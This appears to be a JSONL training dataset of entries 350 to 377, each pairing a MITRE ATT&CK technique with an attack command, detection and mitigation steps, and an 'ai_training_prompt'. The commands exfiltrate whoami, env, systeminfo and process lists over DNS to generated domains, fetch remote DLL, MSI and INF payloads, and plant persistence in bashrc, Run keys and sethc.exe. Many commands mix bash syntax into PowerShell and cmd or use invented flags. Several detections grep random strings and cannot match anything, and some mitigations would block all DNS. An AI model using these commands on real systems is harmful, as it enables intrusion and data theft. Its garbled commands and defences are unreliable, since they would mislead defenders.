{"id":350,"tactic":"Persistence","technique":"T1546.005: Trap","threat":"Abusing trap command locally for persistence on Linux.","command":"echo 'trap \"/bin/bash -c \\\"/tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)sh\\\"\" SIGHUP' >> ~/.bashrc","detection":"Monitor trap in bashrc: `cat ~/.bashrc | grep trap | grep tmp`; Audit file changes: `auditctl -w ~/.bashrc -p wa`.","mitigation":"Restrict bashrc writes: `chmod 600 ~/.bashrc`; Monitor shell configuration changes.","references":["MITRE ATT&CK T1546.005: https://attack.mitre.org/techniques/T1546/005/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect local trap tampering in bashrc and suggest file protections."}
{"id":351,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using nslookup for DNS tunneling to establish C2 channel.","command":"nslookup -type=TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com","detection":"Monitor DNS TXT queries: `tshark -Y 'dns.qry.type == 16' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; High DNS query volume: `netstat -an | findstr :53`.","mitigation":"Restrict nslookup: `icacls %windir%\\System32\\nslookup.exe /deny Everyone:RX`; Deploy DNS filtering: `netsh advfirewall firewall add rule name='Block Suspicious DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect DNS tunneling via nslookup TXT queries by analyzing query frequency, base64-encoded subdomains, and non-standard DNS traffic patterns; suggest DNS filtering rules."}
{"id":352,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using dig for DNS tunneling to exfiltrate data.","command":"dig +short TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(whoami | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor dig TXT queries: `tcpdump -i any port 53 | grep TXT`; Anomalous DNS traffic: `dnstop eth0 | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.","mitigation":"Restrict dig: `chmod 700 /usr/bin/dig`; Enforce DNS inspection: `iptables -A OUTPUT -p udp --dport 53 -j NFQUEUE`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to identify dig-based DNS tunneling by detecting encoded user data in TXT queries, high query rates, and irregular domain patterns; recommend DNS inspection policies."}
{"id":353,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using PowerShell Resolve-DnsName for DNS tunneling C2.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Resolve-DnsName -Type TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null\"","detection":"Monitor Resolve-DnsName: `wmic process where name='powershell.exe' get commandline | findstr Resolve-DnsName`; DNS TXT query spikes: `tshark -Y 'dns.qry.type == 16'`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block TXT DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect PowerShell-based DNS tunneling by analyzing Resolve-DnsName TXT query patterns, base64-encoded subdomains, and DNS traffic anomalies; suggest PowerShell restrictions."}
{"id":354,"tactic":"Persistence","technique":"T1546.003: Windows Management Instrumentation Event Subscription","threat":"Using wmic to create WMI subscription for DNS tunneling C2 trigger.","command":"wmic /NAMESPACE:\\\\root\\subscription PATH __EventFilter CREATE Name=\"$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\",Query=\"SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='nslookup.exe' AND TargetInstance.CommandLine LIKE '%$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com%'\"","detection":"Monitor WMI subscriptions: `wmic /NAMESPACE:\\\\root\\subscription PATH __EventFilter GET /FORMAT:LIST | findstr nslookup`; Event ID 5861.","mitigation":"Restrict WMI: `icacls %windir%\\System32\\wbem\\wmic.exe /deny Everyone:RX`; Audit WMI changes: `auditpol /set /subcategory:'Other Object Access Events' /success:enable`.","references":["MITRE ATT&CK T1546.003: https://attack.mitre.org/techniques/T1546/003/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect WMI subscriptions triggering on DNS tunneling tools like nslookup by analyzing WMI query patterns and process creation events; recommend WMI auditing."}
{"id":355,"tactic":"Defense Evasion","technique":"T1218.011: Rundll32","threat":"Using rundll32 with dnsapi.dll for DNS tunneling C2.","command":"rundll32 dnsapi.dll,DnsQuery_A \"$(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\"","detection":"Monitor rundll32 dnsapi: `wmic process where name='rundll32.exe' get commandline | findstr dnsapi`; YARA rule: `rule Rundll32Dnsapi { strings: $a = /rundll32.*dnsapi.*[a-z0-9]{8}\./ nocase; condition: $a }`.","mitigation":"Restrict rundll32: `icacls %windir%\\System32\\rundll32.exe /deny Everyone:RX`; Block DNS queries: `netsh advfirewall firewall add rule name='Block rundll32 DNS' dir=out program='%windir%\\System32\\rundll32.exe' action=block`.","references":["MITRE ATT&CK T1218.011: https://attack.mitre.org/techniques/T1218/011/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect rundll32 dnsapi-based DNS tunneling by analyzing encoded subdomains, query frequency, and rundll32 command-line arguments; suggest DNS query blocking."}
{"id":356,"tactic":"Command and Control","technique":"T1071.001: Application Layer Protocol: Web Protocols","threat":"Using curl to communicate with Azure metadata service for C2.","command":"curl -H Metadata:true http://169.254.169.254/metadata/instance?api-version=$(cat /dev/urandom | tr -dc '0-9' | head -c 4)-$(cat /dev/urandom | tr -dc '0-9' | head -c 2)-$(cat /dev/urandom | tr -dc '0-9' | head -c 2) -o /tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).json","detection":"Monitor curl metadata access: `ps aux | grep curl | grep 169.254.169.254`; Network traffic: `tcpdump -i any host 169.254.169.254`.","mitigation":"Restrict curl: `chmod 700 /usr/bin/curl`; Block metadata access: `iptables -A OUTPUT -d 169.254.169.254 -j DROP`.","references":["MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect curl-based C2 via Azure metadata service by analyzing HTTP headers, metadata endpoint access, and file creation patterns; recommend network filtering."}
{"id":357,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using dnscmd to create DNS TXT record for data exfiltration.","command":"dnscmd /RecordAdd $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) TXT $(echo $(whoami) | base64 -w0)","detection":"Monitor dnscmd: `wmic process where name='dnscmd.exe' get commandline | findstr RecordAdd`; DNS TXT anomalies: `tshark -Y 'dns.qry.type == 16'`.","mitigation":"Restrict dnscmd: `icacls %windir%\\System32\\dnscmd.exe /deny Everyone:RX`; Enforce DNS monitoring: `netsh advfirewall firewall add rule name='Block Suspicious DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect dnscmd-based DNS exfiltration by analyzing TXT record creation, base64-encoded data, and DNS query spikes; suggest DNS monitoring rules."}
{"id":358,"tactic":"Command and Control","technique":"T1572: Protocol Tunneling","threat":"Using PowerShell to tunnel C2 commands via ICMP.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; ping -n 10 -l 1000 $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com -p $(echo c2cmd | base64 -w0)\"","detection":"Monitor ICMP ping: `wmic process where name='ping.exe' get commandline | findstr -p`; Anomalous ICMP traffic: `tshark -Y 'icmp' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block ICMP: `netsh advfirewall firewall add rule name='Block ICMP' dir=out action=block protocol=ICMPv4`.","references":["MITRE ATT&CK T1572: https://attack.mitre.org/techniques/T1572/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect ICMP-based C2 tunneling via ping by analyzing packet size, base64-encoded patterns, and ICMP traffic anomalies; recommend ICMP filtering."}
{"id":359,"tactic":"Persistence","technique":"T1546.001: Netsh Helper DLL","threat":"Using netsh to register DNS tunneling helper DLL for persistence.","command":"netsh add helper http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor netsh helper: `wmic process where name='netsh.exe' get commandline | findstr helper`; Event ID 4688.","mitigation":"Restrict netsh: `icacls %windir%\\System32\\netsh.exe /deny Everyone:RX`; Block DLL downloads: `netsh advfirewall firewall add rule name='Block Netsh' dir=out action=block protocol=HTTP`.","references":["MITRE ATT&CK T1546.001: https://attack.mitre.org/techniques/T1546/001/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect netsh helper DLL registrations for DNS tunneling by analyzing HTTP-based DLL downloads and netsh command-line arguments; suggest firewall rules."}
{"id":360,"tactic":"Defense Evasion","technique":"T1218.005: Mshta","threat":"Using mshta to execute DNS tunneling JavaScript payload.","command":"mshta javascript:Execute(\"new ActiveXObject('WScript.Shell').Run('nslookup -type=TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)');close()\")","detection":"Monitor mshta JavaScript: `wmic process where name='mshta.exe' get commandline | findstr nslookup`; YARA rule: `rule MshtaDnsTunnel { strings: $a = /mshta.*nslookup.*TXT/ nocase; condition: $a }`.","mitigation":"Restrict mshta: `icacls %windir%\\System32\\mshta.exe /deny Everyone:RX`; Block DNS queries: `netsh advfirewall firewall add rule name='Block mshta DNS' dir=out program='%windir%\\System32\\mshta.exe' action=block`.","references":["MITRE ATT&CK T1218.005: https://attack.mitre.org/techniques/T1218/005/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect mshta-based DNS tunneling by analyzing JavaScript payloads, nslookup TXT queries, and command execution patterns; suggest DNS query restrictions."}
{"id":361,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using dig for DNS tunneling with AAAA records for C2.","command":"dig +short AAAA $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor dig AAAA queries: `tcpdump -i any port 53 | grep AAAA`; Anomalous DNS traffic: `dnstop eth0 | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.","mitigation":"Restrict dig: `chmod 700 /usr/bin/dig`; Enforce DNS inspection: `iptables -A OUTPUT -p udp --dport 53 -j NFQUEUE`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect dig-based DNS tunneling with AAAA records by analyzing query patterns, base64-encoded subdomains, and DNS traffic spikes; recommend DNS inspection."}
{"id":362,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using PowerShell to exfiltrate systeminfo via DNS TXT queries.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; $info = systeminfo | Out-String; $enc = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($info)); Resolve-DnsName -Type TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$enc.$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null\"","detection":"Monitor systeminfo DNS: `wmic process where name='powershell.exe' get commandline | findstr systeminfo`; DNS TXT spikes: `tshark -Y 'dns.qry.type == 16'`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block TXT DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell systeminfo exfiltration via DNS TXT queries by analyzing base64-encoded subdomains, systeminfo execution, and DNS traffic patterns; suggest DNS filtering."}
{"id":363,"tactic":"Command and Control","technique":"T1071.001: Application Layer Protocol: Web Protocols","threat":"Using Invoke-WebRequest for C2 via AWS S3 bucket.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Invoke-WebRequest -Uri https://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).s3.amazonaws.com/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt -OutFile C:\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt\"","detection":"Monitor Invoke-WebRequest: `wmic process where name='powershell.exe' get commandline | findstr s3.amazonaws.com`; Network traffic: `tshark -Y 'http.host contains s3.amazonaws.com'`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block S3 access: `netsh advfirewall firewall add rule name='Block S3' dir=out action=block remoteip=52.216.0.0/15`.","references":["MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect Invoke-WebRequest C2 via AWS S3 by analyzing HTTP requests, S3 bucket URLs, and file creation patterns; recommend S3 IP blocking."}
{"id":364,"tactic":"Persistence","technique":"T1547.001: Registry Run Keys / Startup Folder","threat":"Adding DNS tunneling script to Run registry key.","command":"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) /t REG_SZ /d \"powershell -c 'Resolve-DnsName -Type TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)'\" /f","detection":"Monitor Run key: `reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run | findstr Resolve-DnsName`; Event ID 4657.","mitigation":"Restrict Run writes: `regini -h deny HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`; Audit registry changes: `auditpol /set /subcategory:'Registry' /success:enable`.","references":["MITRE ATT&CK T1547.001: https://attack.mitre.org/techniques/T1547/001/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect DNS tunneling persistence via Run registry by analyzing Resolve-DnsName commands, base64-encoded subdomains, and registry modifications; suggest registry protections."}
{"id":365,"tactic":"Defense Evasion","technique":"T1218.010: Regsvr32","threat":"Using regsvr32 to execute DNS tunneling DLL.","command":"regsvr32 /s http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor regsvr32 HTTP: `wmic process where name='regsvr32.exe' get commandline | findstr http`; YARA rule: `rule Regsvr32DnsTunnel { strings: $a = /regsvr32.*http.*dll/ nocase; condition: $a }`.","mitigation":"Restrict regsvr32: `icacls %windir%\\System32\\regsvr32.exe /deny Everyone:RX`; Block DLL downloads: `netsh advfirewall firewall add rule name='Block regsvr32' dir=out program='%windir%\\System32\\regsvr32.exe' action=block`.","references":["MITRE ATT&CK T1218.010: https://attack.mitre.org/techniques/T1218/010/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect regsvr32-based DNS tunneling by analyzing HTTP DLL downloads, regsvr32 command-line arguments, and DNS query patterns; suggest DLL download restrictions."}
{"id":366,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using nslookup with CNAME records for DNS tunneling C2.","command":"nslookup -type=CNAME $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor DNS CNAME queries: `tshark -Y 'dns.qry.type == 5' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; High DNS query volume: `netstat -an | findstr :53`.","mitigation":"Restrict nslookup: `icacls %windir%\\System32\\nslookup.exe /deny Everyone:RX`; Deploy DNS filtering: `netsh advfirewall firewall add rule name='Block Suspicious DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect DNS tunneling via nslookup CNAME queries by analyzing query frequency, base64-encoded subdomains, and CNAME record patterns; suggest DNS filtering."}
{"id":367,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using dig to exfiltrate environment variables via DNS MX queries.","command":"dig +short MX $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(env | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor dig MX queries: `tcpdump -i any port 53 | grep MX`; Anomalous DNS traffic: `dnstop eth0 | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.","mitigation":"Restrict dig: `chmod 700 /usr/bin/dig`; Enforce DNS inspection: `iptables -A OUTPUT -p udp --dport 53 -j NFQUEUE`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect dig-based DNS exfiltration of environment variables via MX queries by analyzing base64-encoded subdomains and DNS traffic anomalies; recommend DNS inspection."}
{"id":368,"tactic":"Command and Control","technique":"T1572: Protocol Tunneling","threat":"Using PowerShell to tunnel C2 via DNS over HTTPS (DoH).","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Invoke-WebRequest -Uri https://dns.google/resolve?name=$(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)&type=TXT -Method GET | Out-Null\"","detection":"Monitor DoH traffic: `tshark -Y 'http.host contains dns.google' | grep TXT`; PowerShell DoH: `wmic process where name='powershell.exe' get commandline | findstr dns.google`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block DoH: `netsh advfirewall firewall add rule name='Block DoH' dir=out action=block remoteip=8.8.8.8,8.8.4.4`.","references":["MITRE ATT&CK T1572: https://attack.mitre.org/techniques/T1572/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect PowerShell DoH-based DNS tunneling by analyzing HTTPS requests to DoH resolvers, base64-encoded subdomains, and TXT query patterns; suggest DoH blocking."}
{"id":369,"tactic":"Persistence","technique":"T1546.004: Unix Shell Configuration Modification","threat":"Adding DNS tunneling script to Linux shell profile.","command":"echo \"dig +short TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) > /dev/null\" >> ~/.bash_profile","detection":"Monitor bash_profile changes: `cat ~/.bash_profile | grep dig | grep TXT`; Audit file changes: `auditctl -w ~/.bash_profile -p wa`.","mitigation":"Restrict bash_profile writes: `chmod 600 ~/.bash_profile`; Monitor shell configuration changes.","references":["MITRE ATT&CK T1546.004: https://attack.mitre.org/techniques/T1546/004/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect DNS tunneling persistence in Linux shell profiles by analyzing dig TXT commands, base64-encoded subdomains, and file modifications; suggest file protections."}
{"id":370,"tactic":"Defense Evasion","technique":"T1218.007: Msiexec","threat":"Using msiexec to install DNS tunneling MSI package.","command":"msiexec /quiet /i http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).msi) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor msiexec HTTP: `wmic process where name='msiexec.exe' get commandline | findstr http`; YARA rule: `rule MsiexecDnsTunnel { strings: $a = /msiexec.*http.*msi/ nocase; condition: $a }`.","mitigation":"Restrict msiexec: `icacls %windir%\\System32\\msiexec.exe /deny Everyone:RX`; Block MSI downloads: `netsh advfirewall firewall add rule name='Block msiexec' dir=out program='%windir%\\System32\\msiexec.exe' action=block`.","references":["MITRE ATT&CK T1218.007: https://attack.mitre.org/techniques/T1218/007/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect msiexec-based DNS tunneling MSI installations by analyzing HTTP downloads, msiexec command-line arguments, and DNS query patterns; suggest MSI download restrictions."}
{"id":371,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using nslookup with SRV records for DNS tunneling C2.","command":"nslookup -type=SRV _$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)._tcp.$(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor DNS SRV queries: `tshark -Y 'dns.qry.type == 33' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; High DNS query volume: `netstat -an | findstr :53`.","mitigation":"Restrict nslookup: `icacls %windir%\\System32\\nslookup.exe /deny Everyone:RX`; Deploy DNS filtering: `netsh advfirewall firewall add rule name='Block Suspicious DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect DNS tunneling via nslookup SRV queries by analyzing query frequency, base64-encoded subdomains, and SRV record patterns; suggest DNS filtering."}
{"id":372,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using PowerShell to exfiltrate process list via DNS A queries.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; $proc = Get-Process | Out-String; $enc = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($proc)); Resolve-DnsName -Type A $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$enc.$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null\"","detection":"Monitor process DNS: `wmic process where name='powershell.exe' get commandline | findstr Get-Process`; DNS A spikes: `tshark -Y 'dns.qry.type == 1'`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block A DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell process list exfiltration via DNS A queries by analyzing base64-encoded subdomains, Get-Process execution, and DNS traffic patterns; suggest DNS filtering."}
{"id":373,"tactic":"Command and Control","technique":"T1071.001: Application Layer Protocol: Web Protocols","threat":"Using curl to communicate with Google Drive for C2.","command":"curl -H \"Authorization: Bearer $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 32)\" https://www.googleapis.com/drive/v3/files/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)?alt=media -o /tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt","detection":"Monitor curl Google Drive: `ps aux | grep curl | grep googleapis.com`; Network traffic: `tcpdump -i any host www.googleapis.com`.","mitigation":"Restrict curl: `chmod 700 /usr/bin/curl`; Block Google APIs: `iptables -A OUTPUT -d www.googleapis.com -j DROP`.","references":["MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect curl-based C2 via Google Drive by analyzing HTTP headers, Google API endpoints, and file creation patterns; recommend API blocking."}
{"id":374,"tactic":"Persistence","technique":"T1546.008: Accessibility Features","threat":"Abusing sethc.exe for DNS tunneling persistence via replacement.","command":"copy /y $(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) %windir%\\System32\\sethc.exe","detection":"Monitor sethc changes: `dir %windir%\\System32\\sethc.exe /a`; Event ID 4657.","mitigation":"Restrict sethc: `icacls %windir%\\System32\\sethc.exe /deny Everyone:WX`; Enable file integrity monitoring: `sfc /scannow`.","references":["MITRE ATT&CK T1546.008: https://attack.mitre.org/techniques/T1546/008/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect sethc tampering for DNS tunneling persistence by analyzing file modifications, accessibility feature execution, and DNS query patterns; suggest file protections."}
{"id":375,"tactic":"Defense Evasion","technique":"T1218.003: CMSTP","threat":"Using cmstp to execute DNS tunneling INF file.","command":"cmstp /ni /s http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).inf) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor cmstp HTTP: `wmic process where name='cmstp.exe' get commandline | findstr http`; YARA rule: `rule CmstpDnsTunnel { strings: $a = /cmstp.*http.*inf/ nocase; condition: $a }`.","mitigation":"Restrict cmstp: `icacls %windir%\\System32\\cmstp.exe /deny Everyone:RX`; Block INF downloads: `netsh advfirewall firewall add rule name='Block cmstp' dir=out program='%windir%\\System32\\cmstp.exe' action=block`.","references":["MITRE ATT&CK T1218.003: https://attack.mitre.org/techniques/T1218/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect cmstp-based DNS tunneling INF execution by analyzing HTTP downloads, cmstp command-line arguments, and DNS query patterns; suggest INF download restrictions."}
{"id":376,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using PowerShell to perform DNS tunneling with PTR records.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Resolve-DnsName -Type PTR $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null\"","detection":"Monitor PTR queries: `tshark -Y 'dns.qry.type == 12' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; PowerShell DNS: `wmic process where name='powershell.exe' get commandline | findstr Resolve-DnsName`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block PTR DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect PowerShell DNS tunneling with PTR records by analyzing query patterns, base64-encoded subdomains, and PTR record usage; suggest DNS filtering."}
{"id":377,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using dig to exfiltrate user information via DNS NS queries.","command":"dig +short NS $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(whoami | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor dig NS queries: `tcpdump -i any port 53 | grep NS`; Anomalous DNS traffic: `dnstop eth0 | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.","mitigation":"Restrict dig: `chmod 700 /usr/bin/dig`; Enforce DNS inspection: `iptables -A OUTPUT -p udp --dport 53 -j NFQUEUE`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect dig-based DNS exfiltration of user information via NS queries by analyzing base64-encoded subdomains and DNS traffic anomalies; recommend DNS inspection."}
